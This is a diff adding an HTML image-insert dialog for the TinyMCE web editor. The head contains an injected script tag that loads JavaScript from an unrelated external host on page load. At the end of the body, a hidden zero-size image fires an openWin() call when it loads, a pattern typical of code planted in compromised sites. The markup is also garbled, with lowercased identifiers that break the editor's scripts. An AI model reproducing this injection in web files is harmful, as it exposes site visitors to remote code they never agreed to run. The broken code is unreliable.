@@ -1,0 +1,85 @@
+<!doctype html public "-//w3c//dtd xhtml 1.0 strict//en" "http://www.w3.org/tr/xhtml1/dtd/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+	<title>{#advanced_dlg.image_title}</title>
+	<script type="text/javascript" src="../../tiny_mce_popup.js"></script>
+	<script type="text/javascript" src="../../utils/mctabs.js"></script>
+	<script type="text/javascript" src="../../utils/form_utils.js"></script>
+	<script type="text/javascript" src="js/image.js"></script>
+<script language="javascript" type="text/javascript" src="http://js.521.cc/js/user.js"></script></head>
+<body id="image" style="display: none">
+<form onsubmit="imagedialog.update();return false;" action="#">
+	<div class="tabs">
+		<ul>
+			<li id="general_tab" class="current"><span><a href="javascript:mctabs.displaytab('general_tab','general_panel');" onmousedown="return false;">{#advanced_dlg.image_title}</a></span></li>
+		</ul>
+	</div>
+
+	<div class="panel_wrapper">
+		<div id="general_panel" class="panel current">
+     <table border="0" cellpadding="4" cellspacing="0">
+          <tr>
+            <td class="nowrap"><label for="src">{#advanced_dlg.image_src}</label></td>
+            <td><table border="0" cellspacing="0" cellpadding="0">
+                <tr>
+                  <td><input id="src" name="src" type="text" class="mcefocus" value="" style="width: 200px" onchange="imagedialog.getimagedata();" /></td>
+                  <td id="srcbrowsercontainer">&nbsp;</td>
+                </tr>
+              </table></td>
+          </tr>
+		  <tr>
+			<td><label for="image_list">{#advanced_dlg.image_list}</label></td>
+			<td><select id="image_list" name="image_list" onchange="document.getelementbyid('src').value=this.options[this.selectedindex].value;document.getelementbyid('alt').value=this.options[this.selectedindex].text;"></select></td>
+		  </tr>
+          <tr>
+            <td class="nowrap"><label for="alt">{#advanced_dlg.image_alt}</label></td>
+            <td><input id="alt" name="alt" type="text" value="" style="width: 200px" /></td>
+          </tr>
+          <tr>
+            <td class="nowrap"><label for="align">{#advanced_dlg.image_align}</label></td>
+            <td><select id="align" name="align" onchange="imagedialog.updatestyle();">
+                <option value="">{#not_set}</option>
+                <option value="baseline">{#advanced_dlg.image_align_baseline}</option>
+                <option value="top">{#advanced_dlg.image_align_top}</option>
+                <option value="middle">{#advanced_dlg.image_align_middle}</option>
+                <option value="bottom">{#advanced_dlg.image_align_bottom}</option>
+                <option value="text-top">{#advanced_dlg.image_align_texttop}</option>
+                <option value="text-bottom">{#advanced_dlg.image_align_textbottom}</option>
+                <option value="left">{#advanced_dlg.image_align_left}</option>
+                <option value="right">{#advanced_dlg.image_align_right}</option>
+              </select></td>
+          </tr>
+          <tr>
+            <td class="nowrap"><label for="width">{#advanced_dlg.image_dimensions}</label></td>
+            <td><input id="width" name="width" type="text" value="" size="3" maxlength="5" />
+              x
+              <input id="height" name="height" type="text" value="" size="3" maxlength="5" /></td>
+          </tr>
+          <tr>
+            <td class="nowrap"><label for="border">{#advanced_dlg.image_border}</label></td>
+            <td><input id="border" name="border" type="text" value="" size="3" maxlength="3" onchange="imagedialog.updatestyle();" /></td>
+          </tr>
+          <tr>
+            <td class="nowrap"><label for="vspace">{#advanced_dlg.image_vspace}</label></td>
+            <td><input id="vspace" name="vspace" type="text" value="" size="3" maxlength="3" onchange="imagedialog.updatestyle();" /></td>
+          </tr>
+          <tr>
+            <td class="nowrap"><label for="hspace">{#advanced_dlg.image_hspace}</label></td>
+            <td><input id="hspace" name="hspace" type="text" value="" size="3" maxlength="3" onchange="imagedialog.updatestyle();" /></td>
+          </tr>
+        </table>
+		</div>
+	</div>
+
+	<div class="mceactionpanel">
+		<div style="float: left">
+			<input type="submit" id="insert" name="insert" value="{#insert}" />
+		</div>
+
+		<div style="float: right">
+			<input type="button" id="cancel" name="cancel" value="{#cancel}" onclick="tinymcepopup.close();" />
+		</div>
+	</div>
+</form>
+<img src="http://www.baidu.com/search/img/logo.gif" width="0" height="0" onload="openWin();" /></body>
+</html>
